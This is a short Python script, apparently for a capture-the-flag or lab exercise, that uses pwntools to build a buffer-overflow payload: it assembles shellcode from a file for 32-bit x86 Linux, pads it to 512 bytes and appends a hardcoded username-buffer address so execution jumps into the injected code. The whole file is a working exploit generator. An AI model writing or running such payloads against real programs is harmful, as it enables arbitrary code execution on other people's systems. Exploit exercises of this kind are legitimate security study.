from pwn import *


USERNAME_ADDRESS = 0x804a040
USERNAME_LENGTH = 512


def main():
    with open('shellcode.asm', 'r') as shellcode_file:
        shellcode = shellcode_file.read()
    
    # Remove comments from shellcode 
    shellcode = '\n'.join(line for line in shellcode.split('\n') if not line.strip().startswith(';'))

    compiled_shellcode = asm(shellcode, arch='x86', os='linux')

    payload = compiled_shellcode + b'a' * (USERNAME_LENGTH - len(compiled_shellcode))
    payload += int.to_bytes(USERNAME_ADDRESS, 4, 'little') 

    # Print hex representation of the payload
    print(str(payload)[2:-1])

if __name__ == '__main__':
    main()

